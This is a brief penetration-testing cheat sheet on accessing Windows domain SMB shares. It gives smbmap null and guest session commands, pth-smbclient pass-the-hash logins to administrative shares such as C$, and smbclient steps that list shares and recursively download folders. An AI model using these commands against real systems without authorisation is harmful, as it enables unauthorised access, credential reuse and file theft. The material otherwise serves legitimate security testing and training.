# Domain Shares

Some shares can be accessible without authentication, explore them to find some juicy files

[smbmap](https://github.com/ShawnDEvans/smbmap)

```c
smbmap -H 10.10.10.10                # null session
smbmap -H 10.10.10.10 -R             # recursive listing
smbmap -H 10.10.10.10 -u invaliduser # guest smb session
smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
```

[pth-smbclient from path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

```c
pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
ls  # list files
cd  # move inside a folder
get # download files
put # replace a file
```

[smbclient from Impacket](https://github.com/SecureAuthCorp/impacket)

```c
smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk      
        SYSVOL          Disk      Logon server share
        Users           Disk
use Sharename # select a Sharename
cd Folder     # move inside a folder
ls            # list files
```

[smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

```clike
smbclient -U username //10.0.0.1/SYSVOL
smbclient //10.0.0.1/Share

# Download a folder recursively
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> lcd '/path/to/go/'
smb: \> mget *
```
